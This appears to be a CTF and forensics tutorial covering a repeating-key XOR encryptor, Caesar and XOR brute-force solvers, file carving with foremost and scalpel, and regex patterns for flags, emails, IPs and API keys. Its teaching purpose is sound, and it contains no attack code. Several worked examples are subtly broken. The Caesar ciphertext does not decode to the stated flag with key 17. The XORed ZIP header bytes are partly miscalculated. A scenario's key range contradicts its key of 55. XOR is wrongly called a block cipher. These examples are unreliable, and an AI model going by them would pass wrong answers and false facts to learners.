
### Creating custom XOR/Bitwise encryption scripts

#### 1. Technical Theory

XOR (Exclusive OR) is a foundational bitwise operation used in cryptography and basic obfuscation. The operation is defined by the following truth table: $0 \oplus 0 = 0$, $0 \oplus 1 = 1$, $1 \oplus 0 = 1$, and $1 \oplus 1 = 0$.

- **Symmetry and Reversibility:** XOR is its own inverse. This is its key feature in encryption. If $P$ is the plaintext and $K$ is the key, then $P \oplus K = C$ (Ciphertext), and applying the key again, $C \oplus K = P$ (Plaintext).
    
- **Architectural Use:** In CTFs and malware, XOR is used because it is fast and simple to implement. However, security relies entirely on the key. A short, static key is highly susceptible to **frequency analysis** (especially if the plaintext is predictable, like a string of zero bytes or ASCII English text).
    
- **Bitwise Obfuscation:** Other bitwise operators (`&`, `|`, `~`) and shifting operators (`<<`, `>>`) can be chained with XOR to create complex, multi-layered obfuscation routines that complicate quick analysis.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

The goal is to create a cipher script that encrypts a file or string using a simple, repeated key, and then package the encrypted artifact and the encryption script (or its logic) into the challenge.

Python Script: XOR Encryptor/Decryptor

This script uses a simple repeating key (key length is shorter than the data) to encrypt any binary file.

Python

```
import sys
import itertools

def xor_crypt(data: bytes, key: bytes) -> bytes:
    """
    Performs XOR encryption/decryption on binary data using a repeating key.
    :param data: The binary data (plaintext or ciphertext)
    :param key: The encryption key (byte string)
    :return: The resulting byte string
    """
    # Use itertools.cycle to repeat the key indefinitely
    key_cycle = itertools.cycle(key)
    
    # XOR each byte of data with the next byte of the repeating key
    # Use 'zip' to iterate over both sequences simultaneously
    return bytes(data_byte ^ next(key_cycle) for data_byte in data)

def encrypt_file(input_file: str, output_file: str, key_str: str):
    """Encrypts a file and saves the result."""
    try:
        with open(input_file, 'rb') as f:
            plaintext = f.read()
            
        key = key_str.encode('utf-8')
        ciphertext = xor_crypt(plaintext, key)
        
        with open(output_file, 'wb') as f:
            f.write(ciphertext)
            
        print(f"[+] Successfully encrypted '{input_file}' to '{output_file}'")
        print(f"[+] Key (for reference): {key_str}")

    except FileNotFoundError:
        print(f"[-] Error: Input file '{input_file}' not found.")
        sys.exit(1)

if __name__ == "__main__":
    # --- CTF Setup ---
    FLAG_DATA = b"The flag is: CTF{X0R_1s_S1mple_But_Fun}"
    SECRET_KEY = "my_r3p3at1ng_k3y"
    INPUT_FILENAME = "flag.txt"
    OUTPUT_FILENAME = "flag_encrypted.bin"
    
    # 1. Create the input file
    with open(INPUT_FILENAME, 'wb') as f:
        f.write(FLAG_DATA)

    # 2. Encrypt the file (Create the challenge artifact)
    encrypt_file(INPUT_FILENAME, OUTPUT_FILENAME, SECRET_KEY)
    
    # --- Investigator Test (Optional: Proves reversibility) ---
    # with open(OUTPUT_FILENAME, 'rb') as f:
    #     recovered_data = xor_crypt(f.read(), SECRET_KEY.encode('utf-8'))
    # print(f"\n[+] Recovered Data: {recovered_data.decode('utf-8')}")
```

#### 3. Example Scenario

Title: The Corrupted Binary

Scenario: Participants are given a binary file, settings.dat, that contains the configuration for a compromised C2 agent. Running the file command returns "data" and a hex editor view shows random, high-entropy bytes.

The Clue: The attacker's source code (provided in another low-privilege file) contains a function that reads the data and XORs it with the string "C2_KEY_47".

The Challenge: The investigator must recognize the data is XOR-encrypted with a short, repeating key, extract the key from the source code, and use the key to decrypt settings.dat.

The Flag: The decrypted contents of settings.dat contain the flag: CTF{4nalyz3_Th3_C0d3_N0t_Th3_D4ta}.

#### 4. Key Tools

- **Python (Scipy/Custom Scripts):** The primary tool for automating decryption once the key or key length is identified, especially when dealing with large data sets or multi-layer ciphers.
    
- **CyberChef:** An interactive web-based tool often used by investigators to quickly test common XOR keys, perform known-plaintext attacks, and apply brute-force XOR analysis.
    
- **Hex Editors (HxD / 010 Editor):** Essential for visually confirming the high entropy (randomness) of the ciphertext versus the low entropy of the plaintext, which often confirms the use of simple block ciphers like XOR.

## The Investigator (Solution)


### Writing "Solvers" to brute-force custom encoding

#### 1. Technical Theory

When standard encodings (Base64, Hex, URL encoding) fail to decode an artifact, the investigator must assume the challenge uses a **custom encoding** scheme, often a classic cipher like Caesar or Vigenere, or a simple substitution. These schemes rely on a repeatable key or mapping that must be discovered, typically through programmatic brute-forcing or statistical analysis.

**Identification Techniques:**

- **Character Set Analysis:** Examining the characters used. If the output consists only of uppercase letters, it strongly suggests a shift or substitution cipher (e.g., ROT13, Caesar).
    
- **Frequency Analysis:** For monoalphabetic substitution (like Caesar), the frequency distribution of characters in the ciphertext will mirror the known distribution of the plaintext language (e.g., 'E' being the most frequent letter in English).
    
- **Index of Coincidence (IoC):** A metric used to determine if a cipher is polyalphabetic (multiple shifts, like Vigenere) and, if so, to calculate the likely length of the key.
    

#### 2. Practical Implementation (The "How-To")

The core of the solution is writing a Python script that systematically tests every possible decryption key or transformation until a meaningful plaintext segment (e.g., the word "FLAG") is detected.

Step 1: Brute-Forcing a Simple Substitution (Caesar Cipher)

A Caesar cipher involves shifting each letter by a fixed number of positions (the key, 1-25). The simplest solver tries all 25 possible keys.

Python

```
def caesar_brute_force(ciphertext):
    """
    Brute-forces the 25 possible keys for a Caesar cipher.
    Prints potential plaintexts, checking for 'FLAG'.
    """
    ciphertext = ciphertext.upper()
    
    for key in range(1, 26):
        plaintext = ""
        for char in ciphertext:
            if 'A' <= char <= 'Z':
                # Shift character by the current key
                shifted_char = chr(((ord(char) - ord('A') - key) % 26) + ord('A'))
                plaintext += shifted_char
            else:
                # Keep non-alphabetic characters (like spaces or braces) unchanged
                plaintext += char
        
        # Check for the known flag pattern
        if "FLAG" in plaintext or "THE" in plaintext:
            print(f"--- Potential Solution (Key: {key}) ---")
            print(plaintext)

# Example Usage
cipher = "YFHTR{PNSN_ZXS_NHTH}"
caesar_brute_force(cipher) 
# Output will reveal Key: 17, Plaintext: FLAG{CTFS_ARE_FUN}
```

Step 2: Automated Key Guessing and Validation

For long ciphers, relying on the user to visually spot the plaintext is inefficient. A sophisticated solver includes a dictionary or wordlist check to validate potential solutions automatically.

Python

```
def is_valid_plaintext(text):
    """
    A simple validation check using a word list (or common patterns).
    """
    common_words = ["THE", "AND", "FLAG", "IS", "OF", "CTF"]
    for word in common_words:
        if word in text.upper():
            return True
    return False

# Integrated into the solver loop:
# ... (inside the key loop in the previous script)
# if is_valid_plaintext(plaintext):
#     print(f"Solution Found (Key: {key}): {plaintext}")
#     break 
```

Step 3: Solving Polyalphabetic Ciphers (Vigenere)

Vigenere uses multiple shifts determined by a keyword. Solving this requires calculating the Index of Coincidence (IoC) to determine the key length, and then performing frequency analysis on the resulting columns. Dedicated libraries like PyCryptodome simplify this process considerably.

#### 3. Example Scenario

Scenario Name: "The Rotating Secret"

Description: The investigator recovers a log file containing a long, suspicious-looking hex string: 1B351E31341C313C251C2036362536. When decoded from Hex, it reveals a pattern of random ASCII characters, but the character set is clearly limited. The prompt mentions a key between 10 and 20.

The Setup: The architect used a simple XOR cipher with a single 8-bit key (e.g., key=55).

Solution Path:

1. **Revert from Hex:** Decode the string from Hex to raw bytes.
    
2. **Brute-Force XOR:** Write a Python script to iterate through all 256 possible 8-bit XOR keys (0x00 to 0xFF).
    
3. **Validation:** For each result, check for the string "FLAG" or for printable ASCII characters. The correct key will reveal the flag.
    

#### 4. Key Tools

- **Python:** The core scripting language for writing custom solvers.
    
    - **`collections.Counter`:** Essential for frequency analysis.
        
    - **`string` and `math`:** Useful for character manipulation and statistical analysis (like IoC).
        
- **CyberChef:** An interactive, web-based tool often called the "Swiss Army Knife of Forensics." Excellent for quickly visualizing outputs and chaining simple decoders (e.g., Hex -> XOR Brute-Force).
    
- **PyCryptodome (or similar crypto library):** Necessary for efficiently implementing complex ciphers and cryptanalysis techniques (like calculating IoC).

---

### Automating file carving from blobs

#### 1. Technical Theory

File carving is the process of recovering files from raw data by analyzing the data's content rather than relying on file system metadata (such as the Master File Table in NTFS or the File Allocation Table in FAT). This technique is essential when metadata is corrupted, deleted, or missing (e.g., analyzing unallocated disk space, memory dumps, or large database BLOB fields).

- **Blob Context:** In digital forensics, a "blob" (Binary Large Object) typically refers to an unstructured stream of raw bytes, usually from unallocated space or a raw container file.
    
- **Signature Carving:** The core principle is recognizing **file signatures** (magic bytes) at the beginning of files (headers) and optionally locating corresponding footers (file trailers) to determine the logical end of the file.
    
- **Fragmentation Challenge:** Carving is complicated by **file fragmentation**, where a file's content is stored in non-contiguous blocks on the disk. Signature carving tools often fail to fully recover highly fragmented files.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator (Solution)**

The solution involves applying powerful open-source carving tools first, then resorting to custom scripting for non-standard or obfuscated file types.

Method 1: Tool-Based Carving (foremost or scalpel)

These tools are highly efficient at rapidly scanning raw data for hundreds of known file type signatures and are the first step in automation.

1. **Preparation:** Point the tool at the raw data source (e.g., disk image `evidence.dd` or the blob file `data.bin`).
    
2. **Execution (`foremost`):**
    
    Bash
    
    ```
    # -t: Specify file types (jpg, pdf, docx, all)
    # -i: Input file
    # -o: Output directory (MUST be an empty directory)
    foremost -t pdf,jpg,zip -i data.blob -o carved_output/
    ```
    
3. **Execution (`scalpel`):** Scalpel is faster and requires configuration via `scalpel.conf` to specify headers and footers.
    
    Bash
    
    ```
    # Ensure scalpel.conf is configured for your desired file types
    scalpel data.blob -o carved_output/
    ```
    

Method 2: Custom Scripting for Specific Headers (Python)

If the target file type is not standard, or if the challenge requires finding an embedded file with an altered/obfuscated magic byte, custom automation is necessary. This script searches for a specific header pattern within the blob.

- **Scenario:** Finding a flag hidden in a JPEG where the header `FF D8` is followed by the custom sequence `FF F9` instead of the standard `FF E0` (JFIF).
    

Python

```
import binascii

def carve_custom_signature(blob_path, custom_header_hex, output_name):
    """
    Scans a blob for a custom header and extracts a fixed block of data.
    """
    # Convert hex signature string to bytes
    custom_header = binascii.unhexlify(custom_header_hex)
    header_length = len(custom_header)
    
    # Assume the embedded file size is 4096 bytes (e.g., one cluster) for a CTF flag.
    # Adjust this based on context (e.g., look for a footer if known).
    FLAG_SIZE = 4096 
    
    try:
        with open(blob_path, 'rb') as f:
            raw_data = f.read()
            
            # Find all occurrences of the custom header
            offset = 0
            while True:
                # Use bytes.find() for fast binary searching
                index = raw_data.find(custom_header, offset)
                
                if index == -1:
                    break
                
                print(f"[+] Found custom signature at offset: {hex(index)}")
                
                # Extract the assumed file content
                start = index
                end = index + FLAG_SIZE
                
                # Check bounds before extraction
                if end <= len(raw_data):
                    extracted_data = raw_data[start:end]
                    
                    # Save the extracted data
                    with open(f"{output_name}_{hex(index)}.bin", 'wb') as out_f:
                        out_f.write(extracted_data)
                    print(f"    [+] Extracted file saved to {output_name}_{hex(index)}.bin")
                
                # Move offset past the current finding to continue searching
                offset = index + header_length
                
    except FileNotFoundError:
        print(f"[-] Error: Blob file '{blob_path}' not found.")

if __name__ == "__main__":
    # Example: Searching for a custom JPEG signature (FF D8 FF F9)
    # Replace 'input_blob.bin' with the actual evidence file
    carve_custom_signature("input_blob.bin", "FFD8FFF9", "carved_flag")
```

#### 3. Example Scenario

Title: The Database Leak

Scenario: A company database server was compromised. The attacker used a utility to hide small files inside the USER_NOTES table, storing them as raw SQLite BLOBs. The investigator extracts the column data, resulting in a single 10MB notes_data.blob file.

The Artifact: The notes_data.blob contains three JPGs and one ZIP file, all concatenated without file system structure. The ZIP file contains the flag, but its magic bytes (50 4B 03 04) were manually XORed with 0xAA (F0 E1 A9 A6) before being written to the blob.

The Solution:

1. Run `foremost` to recover the obvious JPGs (noise).
    
2. Use a custom Python script, searching the `notes_data.blob` for the XORed ZIP header (`F0 E1 A9 A6`).
    
3. Extract the binary blob found at the matching offset.
    
4. Apply the XOR key (`0xAA`) to the first 4 bytes to restore the ZIP header, then use `unzip` to retrieve the flag.
    

#### 4. Key Tools

- **foremost:** Excellent open-source tool for quick and comprehensive signature-based carving, supporting hundreds of file types.
    
- **scalpel:** A faster, optimized carving tool requiring prior configuration of file signatures via its configuration file.
    
- **Python:** Essential for implementing custom carving logic (as shown above) when dealing with non-standard signatures, obfuscated headers, or complex data structures like fragmented chunks.

---

### Using Regex for pattern matching (flags, emails, IPs) across large datasets.

#### 1. Technical Theory

**Regular Expressions (Regex)** are a sequence of characters that define a search pattern. In digital forensics, Regex is a critical skill for automated text analysis across massive files (disk images, memory dumps, or log archives) to efficiently locate specific artifacts like flags, email addresses, IP addresses, credit card numbers, or proprietary keywords.

**Key Components:**

- **Literals:** Exact characters to match (e.g., `flag{`).
    
- **Metacharacters:** Characters with special meaning (e.g., `.` for any character, `*` for zero or more, `+` for one or more).
    
- **Character Classes:** Shortcuts for groups of characters (e.g., `\d` for any digit, `\w` for any word character, `[A-Za-z]` for letters).
    
- **Anchors:** Specify position (e.g., `^` for start of line, `$` for end of line, `\b` for word boundary).
    

By defining precise patterns, investigators minimize false positives that simple string searches often produce, turning a "search" into a highly specific "match."

#### 2. Practical Implementation (The Investigator)

The investigator uses command-line tools or scripting languages (like Python) to apply Regex patterns to extracted text data from forensic images.

**Method 1: Command Line Filtering (`grep`)**

The `grep` utility (or `findstr` on Windows, or `rg` for Rust's `ripgrep`) is the fastest way to apply Regex filters to large text files.

Bash

```
# Scenario: Searching a massive text dump (strings.txt) for IPv4 addresses

# Pattern: Matches four sets of 1 to 3 digits separated by dots, ensuring word boundaries (\b)
grep -E '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' strings.txt > ips.txt

# Scenario: Searching for a CTF flag pattern (starting with 'flag{' and ending with '}')
grep -P 'flag\{[a-zA-Z0-9_-]{5,40}\}' strings.txt
# Note: -P uses Perl-compatible Regular Expressions (PCRE), required for lookarounds/advanced features
```

**Method 2: Python Scripting for Correlation**

Python's built-in `re` module is ideal for iterating through files, finding multiple patterns, and performing complex data correlation.

Python

```
import re
import os

def find_patterns(filepath):
    # Standard patterns for forensics
    patterns = {
        "email": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',
        "flag_template": r'CTF{.*?}',
        "secret_key": r'\b(SECRET|API)_KEY[=\s:]\s*[\'"]([a-fA-F0-9]{32,64})[\'"]'
    }

    results = {}

    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                results[name] = list(set(matches)) # Store unique matches

    except Exception as e:
        print(f"Error processing {filepath}: {e}")
        return {}
    
    return results

# Example Usage: Process a file extracted from an artifact
output = find_patterns("extracted_data/memdump_strings.txt")
for key, values in output.items():
    print(f"\n--- Found {key} Matches ---")
    for v in values:
        print(v)
```

**Common Forensic Regex Patterns:**

|**Artifact**|**Regex Pattern (PCRE)**|**Description**|
|---|---|---|
|**MAC Address**|`([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})`|Matches standard formats (e.g., `AA:BB:CC:DD:EE:FF`).|
|**Credit Card (Visa)**|`\b4\d{3}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}\b`|Matches 16 digits starting with '4', optionally separated by space/hyphen.|
|**Private IP (192)**|`\b192\.168\.\d{1,3}\.\d{1,3}\b`|Highly specific filter to exclude public traffic.|

#### 3. Example Scenario

Challenge Name: "The Log Scraper"

Scenario Description: A web server was compromised. The attacker left a massive, disorganized log file (access_combined.log) containing millions of entries. The flag is an email address used by the attacker to set up the compromised account.

The Goal: The investigator must efficiently extract all unique email addresses from the 5GB log file and filter them to find the one matching a specific domain pattern.

Solution Steps:

1. Use `grep -P` or a Python script to extract all email addresses using the general email pattern (`r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'`).
    
2. The flag is defined as an email address ending in the newly registered domain `secure-c2.net`.
    
3. The investigator refines the Regex search to be case-insensitive and target the domain: `grep -E -i 'flag\{[A-Za-z0-9._%+-]+@secure-c2\.net\}' access_combined.log`.
    
4. The output reveals the flag: `flag{shadow_user@secure-c2.net}`.
    

#### 4. Key Tools

1. **ripgrep (`rg`):** A modern, highly optimized command-line search utility that recursively searches directories for a regex pattern. It is significantly faster than standard `grep` for large, multi-file datasets.
    
2. **Python (`re` module):** Essential for complex scenarios where correlation, data manipulation, or integration with other libraries (like file system parsers) is required beyond simple line matching.
    
3. **grep (or `findstr`):** The default, ubiquitous command-line utility for initial, simple pattern matching and filtering on Linux and Windows systems.

